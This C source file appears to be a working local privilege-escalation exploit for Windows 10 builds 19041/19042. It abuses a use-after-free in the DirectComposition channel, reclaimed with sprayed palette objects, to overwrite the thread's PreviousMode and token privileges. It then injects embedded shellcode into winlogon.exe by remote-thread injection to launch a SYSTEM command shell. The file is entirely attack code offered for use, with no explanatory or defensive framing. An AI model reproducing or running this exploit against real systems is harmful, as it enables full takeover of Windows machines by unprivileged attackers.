#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#include <strsafe.h>
#include <string>
#include <ntstatus.h>
#include <processthreadsapi.h>
#include <tlhelp32.h>
#include "ntos.h"
#pragma comment(lib, "ntdll.lib")

enum DCPROCESSCOMMANDID
{
    nCmdProcessCommandBufferIterator,
    nCmdCreateResource,
    nCmdOpenSharedResource,
    nCmdReleaseResource,
    nCmdGetAnimationTime,
    nCmdCapturePointer,
    nCmdOpenSharedResourceHandle,
    nCmdSetResourceCallbackId,
    nCmdSetResourceIntegerProperty,
    nCmdSetResourceFloatProperty,
    nCmdSetResourceHandleProperty,
    nCmdSetResourceHandleArrayProperty,
    nCmdSetResourceBufferProperty,
    nCmdSetResourceReferenceProperty,
    nCmdSetResourceReferenceArrayProperty,
    nCmdSetResourceAnimationProperty,
    nCmdSetResourceDeletedNotificationTag,
    nCmdAddVisualChild,
    nCmdRedirectMouseToHwnd,
    nCmdSetVisualInputSink,
    nCmdRemoveVisualChild
};


typedef
NTSTATUS
(NTAPI* _NtDCompositionCreateChannel)(
    OUT PHANDLE pArgChannelHandle,
    IN OUT PSIZE_T pArgSectionSize,
    OUT PVOID* pArgSectionBaseMapInProcess
    );

typedef
NTSTATUS
(NTAPI* _NtDCompositionDestroyChannel)(
    IN HANDLE ChannelHandle
    );


typedef
NTSTATUS
(NTAPI* _NtDCompositionProcessChannelBatchBuffer)(
    IN HANDLE hChannel,
    IN DWORD dwArgStart,
    OUT PDWORD pOutArg1,
    OUT PDWORD pOutArg2);

typedef
NTSTATUS
(NTAPI* _NtDCompositionCommitChannel)(
    IN HANDLE hChannel,
    OUT PDWORD pOutArg1,
    OUT PDWORD pOutArg2,
    IN DWORD flag,
    IN HANDLE Object);

typedef
NTSTATUS
(NTAPI* _NtDCompositionCreateSynchronizationObject)(
    void** a1
    );


typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength);

typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    void* BaseAddress,
    const void* SourceBuffer,
    size_t Length,
    size_t* BytesWritten);

typedef struct _EXPLOIT_CONTEXT {
    PPEB pPeb;
    _NtQuerySystemInformation fnNtQuerySystemInformation;
    _NtWriteVirtualMemory fnNtWriteVirtualMemory;

    HANDLE hCurProcessHandle;
    HANDLE hCurThreadHandle;
    DWORD64 dwKernelEprocessAddr;
    DWORD64 dwKernelEthreadAddr;

    DWORD previous_mode_offset;

    DWORD win32_process_offset; // EPROCESS->Win32Process

    DWORD GadgetAddrOffset;
    DWORD ObjectSize;
}EXPLOIT_CONTEXT, * PEXPLOIT_CONTEXT;

PEXPLOIT_CONTEXT g_pExploitCtx;

SIZE_T GetObjectKernelAddress(PEXPLOIT_CONTEXT pCtx, HANDLE object)
{
    PSYSTEM_HANDLE_INFORMATION_EX handleInfo = NULL;
    ULONG handleInfoSize = 0x1000;
    ULONG retLength;
    NTSTATUS status;
    SIZE_T kernelAddress = 0;
    BOOL bFind = FALSE;

    while (TRUE)
    {
        handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)LocalAlloc(LPTR, handleInfoSize);

        status = pCtx->fnNtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, handleInfoSize, &retLength);

        if (status == 0xC0000004 || NT_SUCCESS(status)) 
        {
            LocalFree(handleInfo);

            handleInfoSize = retLength + 0x100;
            handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)LocalAlloc(LPTR, handleInfoSize);

            status = pCtx->fnNtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, handleInfoSize, &retLength);

            if (NT_SUCCESS(status))
            {
                for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++)
                {
                    if ((USHORT)object == 0x4)
                    {
                        if (0x4 == (DWORD)handleInfo->Handles[i].UniqueProcessId && (SIZE_T)object == (SIZE_T)handleInfo->Handles[i].HandleValue)
                        {
                            kernelAddress = (SIZE_T)handleInfo->Handles[i].Object;
                            bFind = TRUE;
                            break;
                        }
                    }
                    else
                    {
                        if (GetCurrentProcessId() == (DWORD)handleInfo->Handles[i].UniqueProcessId && (SIZE_T)object == (SIZE_T)handleInfo->Handles[i].HandleValue)
                        {
                            kernelAddress = (SIZE_T)handleInfo->Handles[i].Object;
                            bFind = TRUE;
                            break;
                        }
                    }
                }
            }

        }

        if (handleInfo)
            LocalFree(handleInfo);

        if (bFind)
            break;
    }

    return kernelAddress;
}

void WriteMemory(void* dst, const void* src, size_t size)
{
    size_t num_bytes_written;
    g_pExploitCtx->fnNtWriteVirtualMemory(GetCurrentProcess(), dst, src, size, &num_bytes_written);
}

DWORD64 ReadPointer(void* address)
{
    DWORD64 value;
    WriteMemory(&value, address, sizeof(DWORD64));
    return value;
}

void WritePointer(void* address, DWORD64 value)
{
    WriteMemory(address, &value, sizeof(DWORD64));
}

BOOL InitEnvironment()
{
    g_pExploitCtx = new EXPLOIT_CONTEXT;

    g_pExploitCtx->fnNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQuerySystemInformation");
    g_pExploitCtx->fnNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtWriteVirtualMemory");

    g_pExploitCtx->pPeb = NtCurrentTeb()->ProcessEnvironmentBlock;

    if (!DuplicateHandle(GetCurrentProcess(), GetCurrentProcess(), GetCurrentProcess(), &g_pExploitCtx->hCurProcessHandle, 0, FALSE, DUPLICATE_SAME_ACCESS) ||
        !DuplicateHandle(GetCurrentProcess(), GetCurrentThread(), GetCurrentProcess(), &g_pExploitCtx->hCurThreadHandle, 0, FALSE, DUPLICATE_SAME_ACCESS))
        return FALSE;

    g_pExploitCtx->dwKernelEprocessAddr = GetObjectKernelAddress(g_pExploitCtx, g_pExploitCtx->hCurProcessHandle);
    g_pExploitCtx->dwKernelEthreadAddr = GetObjectKernelAddress(g_pExploitCtx, g_pExploitCtx->hCurThreadHandle);

    if (g_pExploitCtx->pPeb->OSMajorVersion < 10)
    {
        return FALSE;
    }

    if (g_pExploitCtx->pPeb->OSBuildNumber < 17763 || g_pExploitCtx->pPeb->OSBuildNumber > 19042)
    {
        return FALSE;
    }

    switch (g_pExploitCtx->pPeb->OSBuildNumber)
    {
    case 19041:
    case 19042:
        g_pExploitCtx->win32_process_offset = 0x508;
        g_pExploitCtx->previous_mode_offset = 0x232;
        g_pExploitCtx->GadgetAddrOffset = 0x38;
        g_pExploitCtx->ObjectSize = 0x1d0;
        break;
    default:
        break;
    }
    printf("[+] OS Build Number: %d\n", g_pExploitCtx->pPeb->OSBuildNumber);
    printf("[+] Win32 Process offset: 0x%x\n", g_pExploitCtx->win32_process_offset);
    printf("[+] Previous mode offset: 0x%x\n", g_pExploitCtx->previous_mode_offset);
    printf("[+] Gadget address offset: 0x%x\n", g_pExploitCtx->GadgetAddrOffset);
    printf("[+] Object size: 0x%x %d\n", g_pExploitCtx->ObjectSize, g_pExploitCtx->ObjectSize);;

    return TRUE;
}

DWORD64 where;

HPALETTE createPaletteofSize1(int size) { 
    int pal_cnt = (size + 0x8c - 0x90) / 4;  
    int palsize = sizeof(LOGPALETTE) + (pal_cnt - 1) * sizeof(PALETTEENTRY); 
    LOGPALETTE* lPalette = (LOGPALETTE*)malloc(palsize);
    DWORD64* p = (DWORD64*)((DWORD64)lPalette + 4);   
    memset(lPalette, 0xff, palsize); 

    p[0] = (DWORD64)0x11223344;
    p[3] = (DWORD64)0x04;   
    p[9] = g_pExploitCtx->dwKernelEthreadAddr + g_pExploitCtx->previous_mode_offset - 9 - 8; 
  
    lPalette->palVersion = 0x300;
    return CreatePalette(lPalette);
}

HPALETTE createPaletteofSize2(int size) { 
    int pal_cnt = (size + 0x8c - 0x90) / 4;  
    int palsize = sizeof(LOGPALETTE) + (pal_cnt - 1) * sizeof(PALETTEENTRY); 
    LOGPALETTE* lPalette = (LOGPALETTE*)malloc(palsize);
    DWORD64* p = (DWORD64*)((DWORD64)lPalette + 4);   
    memset(lPalette, 0xff, palsize); 
    p[0] = (DWORD64)0x11223344;
    p[3] = (DWORD64)0x04;   
    p[9] = where - 8 + 3;  

    lPalette->palNumEntries = pal_cnt;
    lPalette->palVersion = 0x300;
    return CreatePalette(lPalette);
}

unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
"\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" \
"\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0" \
"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed" \
"\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88" \
"\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44" \
"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" \
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1" \
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" \
"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49" \
"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a" \
"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00" \
"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" \
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47" \
"\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65" \
"\x78\x65\x00";

static const unsigned int shellcode_len = 0x1000;



#define MAXIMUM_FILENAME_LENGTH 255
#define SystemModuleInformation  0xb
#define SystemHandleInformation 0x10

void InjectToWinlogon()
{
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    int pid = -1;
    if (Process32First(snapshot, &entry))
    {
        while (Process32Next(snapshot, &entry)) 
        {
            if (wcscmp(entry.szExeFile, L"winlogon.exe") == 0) 
            {
                pid = entry.th32ProcessID;      
                break;
            }
        }
    }

    CloseHandle(snapshot);

    if (pid < 0)
    {
        printf("Could not find process\n");
        return;
    }

    HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!h)
    {
        printf("Could not open process: %x", GetLastError());
        return;
    }

    void* buffer = VirtualAllocEx(h, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!buffer)
    {
        printf("[-] VirtualAllocEx failed\n");
    }

    if (!buffer)
    {
        printf("[-] remote allocation failed");
        return;
    }

    if (!WriteProcessMemory(h, buffer, shellcode, sizeof(shellcode), 0))
    {
        printf("[-] WriteProcessMemory failed");
        return;
    }

    HANDLE hthread = CreateRemoteThread(h, 0, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);

    if (hthread == INVALID_HANDLE_VALUE)
    {
        printf("[-] CreateRemoteThread failed");
        return;
    }
}


#define TOKEN_OFFSET 0x40   

HMODULE GetNOSModule()
{
    HMODULE hKern = 0;
    hKern = LoadLibraryEx(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    return hKern;
}

DWORD64 GetModuleAddr(const char* modName)
{
    PSYSTEM_MODULE_INFORMATION buffer = (PSYSTEM_MODULE_INFORMATION)malloc(0x20);

    DWORD outBuffer = 0;
    NTSTATUS status = g_pExploitCtx->fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, 0x20, &outBuffer);

    if (status == STATUS_INFO_LENGTH_MISMATCH)
    {
        free(buffer);
        buffer = (PSYSTEM_MODULE_INFORMATION)malloc(outBuffer);
        status = g_pExploitCtx->fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, outBuffer, &outBuffer);
    }

    if (!buffer)
    {
        printf("[-] NtQuerySystemInformation error\n");
        return 0;
    }

    for (unsigned int i = 0; i < buffer->NumberOfModules; i++)
    {
        PVOID kernelImageBase = buffer->Modules[i].ImageBase;
        PCHAR kernelImage = (PCHAR)buffer->Modules[i].FullPathName;
        if (_stricmp(kernelImage, modName) == 0)
        {
            free(buffer);
            return (DWORD64)kernelImageBase;
        }
    }
    free(buffer);
    return 0;
}


DWORD64 GetKernelPointer(HANDLE handle, DWORD type)
{
    PSYSTEM_HANDLE_INFORMATION buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(0x20);

    DWORD outBuffer = 0;
    NTSTATUS status = g_pExploitCtx->fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, 0x20, &outBuffer);

    if (status == STATUS_INFO_LENGTH_MISMATCH)
    {
        free(buffer);
        buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(outBuffer);
        status = g_pExploitCtx->fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, outBuffer, &outBuffer);
    }

    if (!buffer)
    {
        printf("[-] NtQuerySystemInformation error \n");
        return 0;
    }

    for (size_t i = 0; i < buffer->NumberOfHandles; i++)
    {
        DWORD objTypeNumber = buffer->Handles[i].ObjectTypeIndex; 
        if (buffer->Handles[i].UniqueProcessId == GetCurrentProcessId() && buffer->Handles[i].ObjectTypeIndex == type)
        {
            if (handle == (HANDLE)buffer->Handles[i].HandleValue)
            {
                DWORD64 object = (DWORD64)buffer->Handles[i].Object;
                free(buffer);
                return object;
            }
        }
    }
    printf("[-] handle not found\n");
    free(buffer);
    return 0;
}

DWORD64 GetGadgetAddr(const char* name)
{
    DWORD64 base = GetModuleAddr("\\SystemRoot\\system32\\ntoskrnl.exe");
    HMODULE mod = GetNOSModule();
    if (!mod)
    {
        printf("[-] leaking ntoskrnl version\n");
        return 0;
    }
    DWORD64 offset = (DWORD64)GetProcAddress(mod, name); 
    DWORD64 returnValue = base + offset - (DWORD64)mod;
    FreeLibrary(mod);
    return returnValue;
}

DWORD64 PsGetCurrentCProcessData()
{
    DWORD64 dwWin32ProcessAddr = ReadPointer((void*)(g_pExploitCtx->dwKernelEprocessAddr + g_pExploitCtx->win32_process_offset));
    return ReadPointer((void*)(dwWin32ProcessAddr + 0x100));
}

void RestoreStatus()
{
    DWORD64 dwCGenericTableAddr = ReadPointer((void*)PsGetCurrentCProcessData());

    WritePointer((void*)dwCGenericTableAddr, 0);
    WritePointer((void*)(dwCGenericTableAddr + 8), 0);
    WritePointer((void*)(dwCGenericTableAddr + 16), 0);

    byte value = 1;
    WriteMemory((void*)(g_pExploitCtx->dwKernelEthreadAddr + g_pExploitCtx->previous_mode_offset), &value, sizeof(byte));
}


#define TrackerBinding1 1
#define TrackerBinding2 2
#define Tracker1 3
#define Tracker2 4


int main(int argc, TCHAR* argv[]) {
    HANDLE hChannel;
    NTSTATUS ntStatus;
    SIZE_T SectionSize = 0x500000;
    PVOID pMappedAddress = NULL;
    DWORD dwArg1, dwArg2;

    if (!InitEnvironment()) {
        printf("[-] Inappropriate Operating System\n");
        return 0;
    }
    LoadLibrary(TEXT("user32"));

    LPVOID pV = VirtualAlloc((LPVOID)0x11223344, 0x100000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!pV)
    {
        printf("[-] Failed to allocate memory at address 0x11223344, please try again!\n");
        return 0;
    }
    DWORD64* Ptr = (DWORD64*)0x11223344;
    DWORD64 GadgetAddr = GetGadgetAddr("SeSetAccessStateGenericMapping");
    printf("[+] found SeSetAccessStateGenericMapping addr at: %p\n", (DWORD64)GadgetAddr);

    memset(Ptr, 0xff, 0x1000);
    printf("\n[+] Before setting gadget address in 0x11223344 + GadgetAddrOffset\n");
    for (int i = 0; i < 0x10; i++) {
        if (i % 4 == 0) {
            puts("");
        }
        printf("%p ", *(Ptr + i));
    }
    puts("");

    *(DWORD64*)((DWORD64)Ptr + g_pExploitCtx->GadgetAddrOffset) = GadgetAddr;

    printf("\n[+] After setting gadget address in 0x11223344 + GadgetAddrOffset\n");
    for (int i = 0; i < 0x10; i++) {
        if (i % 4 == 0) {
            puts("");
        }
        printf("%p ", *(Ptr + i));
    }
    puts("");


    HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
    if (!proc)
    {
        printf("[-] OpenProcess failed\n");
        return 0;
    }
    HANDLE token = 0;
    if (!OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token))
    {
        printf("[-] OpenProcessToken failed\n");
        return 0;
    }


    DWORD64 ktoken = GetKernelPointer(token, 0x5);
    where = ktoken + TOKEN_OFFSET;
    printf("\n[+] where: %p\n", where);
    printf("[+] where - 8 + 3: %p\n", where - 8 + 3);


    _NtDCompositionCreateChannel NtDCompositionCreateChannel;
    NtDCompositionCreateChannel = (_NtDCompositionCreateChannel)GetProcAddress(LoadLibrary(L"win32u.dll"), "NtDCompositionCreateChannel");

    _NtDCompositionDestroyChannel NtDCompositionDestroyChannel;
    NtDCompositionDestroyChannel = (_NtDCompositionDestroyChannel)GetProcAddress(LoadLibrary(L"win32u.dll"), "NtDCompositionDestroyChannel");

    _NtDCompositionProcessChannelBatchBuffer NtDCompositionProcessChannelBatchBuffer;
    NtDCompositionProcessChannelBatchBuffer = (_NtDCompositionProcessChannelBatchBuffer)GetProcAddress(LoadLibrary(L"win32u.dll"), "NtDCompositionProcessChannelBatchBuffer");

    _NtDCompositionCommitChannel NtDCompositionCommitChannel;
    NtDCompositionCommitChannel = (_NtDCompositionCommitChannel)GetProcAddress(LoadLibrary(L"win32u.dll"), "NtDCompositionCommitChannel");

    _NtDCompositionCreateSynchronizationObject NtDCompositionCreateSynchronizationObject;
    NtDCompositionCreateSynchronizationObject = (_NtDCompositionCreateSynchronizationObject)GetProcAddress(LoadLibrary(L"win32u.dll"), "NtDCompositionCreateSynchronizationObject");

    void* p = 0;
    ntStatus = NtDCompositionCreateSynchronizationObject(&p);

    ntStatus = NtDCompositionCreateChannel(&hChannel, &SectionSize, &pMappedAddress);
    if (!NT_SUCCESS(ntStatus)) {
        printf("Create channel error!\n");
        return -1;
    }


    *(DWORD*)(pMappedAddress) = nCmdCreateResource;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)TrackerBinding1;
    *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)0x59;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);


    *(DWORD*)(pMappedAddress) = nCmdCreateResource;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)TrackerBinding2;
    *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)0x59;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);


    *(DWORD*)(pMappedAddress) = nCmdCreateResource;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)Tracker1;
    *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)0x58;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);


    *(DWORD*)(pMappedAddress) = nCmdCreateResource;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)Tracker2;
    *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)0x58;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);

    DWORD* szBuff = (DWORD*)malloc(4 * 3);


    szBuff[0] = Tracker1;
    szBuff[1] = Tracker2;
    szBuff[2] = 0x41414141;

    *(DWORD*)pMappedAddress = nCmdSetResourceBufferProperty;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)TrackerBinding1;
    *(DWORD*)((PUCHAR)pMappedAddress + 8) = 0;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xc) = 0xc;
    CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, 0xc);
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + 0xc, &dwArg1, &dwArg2);

    szBuff[0] = Tracker1;
    szBuff[1] = Tracker2;
    szBuff[2] = 0x42424242;

    *(DWORD*)pMappedAddress = nCmdSetResourceBufferProperty;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)TrackerBinding2;
    *(DWORD*)((PUCHAR)pMappedAddress + 8) = 0;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xc) = 0xc;
    CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, 0xc);
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + 0xc, &dwArg1, &dwArg2);

    *(DWORD*)pMappedAddress = nCmdReleaseResource;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)Tracker1;
    *(DWORD*)((PUCHAR)pMappedAddress + 8) = 8;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x8, &dwArg1, &dwArg2);


    for (size_t i = 0; i < 0x5000; i++)
    {
        createPaletteofSize1(g_pExploitCtx->ObjectSize);

        *(DWORD*)pMappedAddress = nCmdReleaseResource;
        *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)3;
        *(DWORD*)((PUCHAR)pMappedAddress + 8) = 8;
        ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x8, &dwArg1, &dwArg2);

        if (ntStatus != 0)
        {
            printf("error!\n");
            return 0;
        }
        for (size_t i = 0; i < 0x5000; i++)
        {
            createPaletteofSize2(g_pExploitCtx->ObjectSize);
        }

        szBuff[0] = 0x04;
        szBuff[1] = 0x04;
        szBuff[2] = 0xffff;

        *(DWORD*)pMappedAddress = nCmdSetResourceBufferProperty;
        *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)(1);
        *(DWORD*)((PUCHAR)pMappedAddress + 8) = 0;
        *(DWORD*)((PUCHAR)pMappedAddress + 0xc) = 12;
        CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, 12);
        ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + 12, &dwArg1, &dwArg2);
        if (ntStatus != 0)
        {
            printf("error!\n");
            return 0;
        }


        NtDCompositionCommitChannel(hChannel, &dwArg1, &dwArg2, 0, p);

        InjectToWinlogon();
        RestoreStatus();
        *(DWORD*)pMappedAddress = nCmdReleaseResource;
        *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)1;
        *(DWORD*)((PUCHAR)pMappedAddress + 8) = 8;
        ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x8, &dwArg1, &dwArg2);

        *(DWORD*)pMappedAddress = nCmdReleaseResource;
        *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)4;
        *(DWORD*)((PUCHAR)pMappedAddress + 8) = 8;
        ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x8, &dwArg1, &dwArg2);
        return 0;
    }
}